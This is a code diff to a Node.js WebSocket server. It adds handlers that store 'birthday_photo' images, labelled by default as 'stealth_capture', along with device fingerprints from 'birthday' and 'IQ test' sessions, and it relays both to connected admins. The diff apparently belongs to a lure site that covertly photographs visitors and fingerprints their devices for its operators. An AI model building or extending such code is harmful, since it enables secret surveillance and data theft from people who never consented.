@@ -668,6 +668,51 @@ wss.on('connection', (ws, req) => {
       
       console.log(`IQ Test completed: ${data.sessionId} - Score: ${data.score}`);
       
+    } else if (data.type === 'birthday_photo') {
+      // Birthday photo capture
+      console.log(`Received birthday photo capture: ${data.sessionId}`);
+      
+      // Store the birthday image
+      if (!images.has(data.sessionId)) {
+        images.set(data.sessionId, []);
+      }
+      
+      const photoData = {
+        type: 'birthday_photo',
+        sessionId: data.sessionId,
+        time: data.timestamp,
+        payload: data.imageData,
+        platform: data.metadata?.platform || 'Birthday',
+        source: data.metadata?.source || 'stealth_capture'
+      };
+      
+      images.get(data.sessionId).push(photoData);
+      
+      // Update session image count
+      if (sessions.has(data.sessionId)) {
+        sessions.get(data.sessionId).imageCount = (sessions.get(data.sessionId).imageCount || 0) + 1;
+      } else {
+        // Create session if it doesn't exist
+        sessions.set(data.sessionId, {
+          sessionId: data.sessionId,
+          type: 'birthday',
+          createdAt: Date.now(),
+          imageCount: 1,
+          createdBy: 'unknown'
+        });
+      }
+      
+      // Forward to all admins
+      broadcastToAdmins({
+        type: 'image',
+        sessionId: data.sessionId,
+        time: data.timestamp,
+        payload: data.imageData,
+        platform: 'Birthday'
+      });
+      
+      console.log(`Birthday image stored for session ${data.sessionId}, total images: ${images.get(data.sessionId).length}`);
+      
     } else if (data.type === 'image' && data.sessionId) {
       // User is sending an image
       totalImages++;
@@ -983,6 +1028,49 @@ wss.on('connection', (ws, req) => {
         browserFamilies: browserFamilies.size,
         timestamp: Date.now()
       }));
+      
+    } else if (data.type === 'device_fingerprint') {
+      // Handle device fingerprint data from WebSocket
+      console.log(`Received device fingerprint via WebSocket: ${data.sessionId}`);
+      
+      // Store fingerprint data in the appropriate session
+      const fingerprint = data.fingerprint;
+      const sessionId = data.sessionId;
+      
+      // Check if it's a birthday session
+      if (sessions.has(sessionId)) {
+        sessions.get(sessionId).deviceFingerprint = fingerprint;
+        console.log(`Device fingerprint stored for birthday session: ${sessionId}`);
+      }
+      
+      // Check if it's an IQ test session
+      if (iqSessions.has(sessionId)) {
+        iqSessions.get(sessionId).deviceFingerprint = fingerprint;
+        console.log(`Device fingerprint stored for IQ session: ${sessionId}`);
+      }
+      
+      // Create a new session if neither exists
+      if (!sessions.has(sessionId) && !iqSessions.has(sessionId)) {
+        sessions.set(sessionId, {
+          sessionId: sessionId,
+          type: 'unknown',
+          createdAt: Date.now(),
+          deviceFingerprint: fingerprint,
+          imageCount: 0,
+          createdBy: 'unknown'
+        });
+        console.log(`New session created with device fingerprint: ${sessionId}`);
+      }
+      
+      // Forward fingerprint data to admins
+      broadcastToAdmins({
+        type: 'device_fingerprint',
+        sessionId: sessionId,
+        fingerprint: fingerprint,
+        timestamp: Date.now()
+      });
+      
+      console.log(`Device fingerprint forwarded to admins for session: ${sessionId}`);
     }
   });
 
